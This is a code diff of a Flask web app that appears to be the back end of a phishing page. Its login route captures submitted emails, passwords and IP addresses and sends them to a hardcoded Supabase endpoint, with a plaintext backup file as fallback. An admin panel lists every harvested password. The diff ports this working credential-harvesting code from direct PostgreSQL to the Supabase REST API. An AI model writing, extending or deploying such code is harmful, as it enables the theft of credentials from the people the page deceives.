@@ -1,34 +1,42 @@
-from flask import Flask, request, redirect, jsonify, session, render_template_string
+from flask import Flask, request, redirect, session, render_template_string
 import datetime
 import os
-import psycopg2
+import requests as http_requests
 import functools
+import json
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
-ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin123')
+ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'changeme')
+SUPABASE_URL = "https://kbejfnprbyriyyalurpo.supabase.co"
+SUPABASE_KEY = os.environ.get('SUPABASE_SECRET_KEY', '')
 
-def get_db():
-    return psycopg2.connect(os.environ['SUPABASE_DB_URL'])
+def supabase_headers():
+    return {
+        "apikey": SUPABASE_KEY,
+        "Authorization": f"Bearer {SUPABASE_KEY}",
+        "Content-Type": "application/json",
+        "Prefer": "return=representation"
+    }
 
 def init_db():
-    conn = get_db()
-    cur = conn.cursor()
-    cur.execute('''
-        CREATE TABLE IF NOT EXISTS logins (
-            id SERIAL PRIMARY KEY,
-            timestamp TIMESTAMPTZ DEFAULT NOW(),
-            ip_address TEXT,
-            email TEXT,
-            password TEXT
-        )
-    ''')
-    conn.commit()
-    cur.close()
-    conn.close()
+    headers = supabase_headers()
+    headers["Content-Type"] = "application/json"
+    resp = http_requests.post(
+        f"{SUPABASE_URL}/rest/v1/rpc/init_logins_table",
+        headers=headers,
+        json={}
+    )
+    if resp.status_code not in (200, 204):
+        print(f"Note: Could not auto-create table via RPC ({resp.status_code}). Make sure the 'logins' table exists in Supabase.")
+    else:
+        print("Database table ready.")
 
-init_db()
+try:
+    init_db()
+except Exception as e:
+    print(f"DB init note: {e} — will attempt inserts anyway.")
 
 @app.route('/')
 def index():
@@ -39,18 +47,30 @@ def login():
     email = request.form.get('email')
     password = request.form.get('password')
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
-    conn = get_db()
-    cur = conn.cursor()
-    cur.execute(
-        'INSERT INTO logins (ip_address, email, password) VALUES (%s, %s, %s)',
-        (ip, email, password)
-    )
-    conn.commit()
-    cur.close()
-    conn.close()
+    data = {
+        "ip_address": ip,
+        "email": email,
+        "password": password
+    }
 
-    print(f"Logged: {ip} | {email}")
+    try:
+        resp = http_requests.post(
+            f"{SUPABASE_URL}/rest/v1/logins",
+            headers=supabase_headers(),
+            json=data
+        )
+        if resp.status_code == 201:
+            print(f"Logged to DB: {ip} | {email}")
+        else:
+            print(f"DB insert failed ({resp.status_code}): {resp.text}")
+            with open("logins_backup.txt", "a") as f:
+                f.write(f"{timestamp} | {ip} | {email} | {password}\n")
+    except Exception as e:
+        print(f"DB error: {e} — saving to backup file")
+        with open("logins_backup.txt", "a") as f:
+            f.write(f"{timestamp} | {ip} | {email} | {password}\n")
 
     return """
     <html>
@@ -112,12 +132,16 @@ def admin_login():
 @app.route('/admin')
 @login_required
 def admin_panel():
-    conn = get_db()
-    cur = conn.cursor()
-    cur.execute('SELECT id, timestamp, ip_address, email, password FROM logins ORDER BY timestamp DESC')
-    rows = cur.fetchall()
-    cur.close()
-    conn.close()
+    resp = http_requests.get(
+        f"{SUPABASE_URL}/rest/v1/logins?select=*&order=created_at.desc",
+        headers=supabase_headers()
+    )
+
+    rows = []
+    if resp.status_code == 200:
+        rows = resp.json()
+    else:
+        print(f"Failed to fetch logins: {resp.status_code} {resp.text}")
 
     return render_template_string('''
     <html>
@@ -144,11 +168,11 @@ def admin_panel():
             <tr><th>#</th><th>Time</th><th>IP Address</th><th>Email</th><th>Password</th></tr>
             {% for row in rows %}
             <tr>
-                <td>{{ row[0] }}</td>
-                <td>{{ row[1].strftime('%Y-%m-%d %H:%M:%S') if row[1] else '' }}</td>
-                <td>{{ row[2] }}</td>
-                <td>{{ row[3] }}</td>
-                <td>{{ row[4] }}</td>
+                <td>{{ row.get('id', '') }}</td>
+                <td>{{ row.get('created_at', '') }}</td>
+                <td>{{ row.get('ip_address', '') }}</td>
+                <td>{{ row.get('email', '') }}</td>
+                <td>{{ row.get('password', '') }}</td>
             </tr>
             {% endfor %}
         </table>
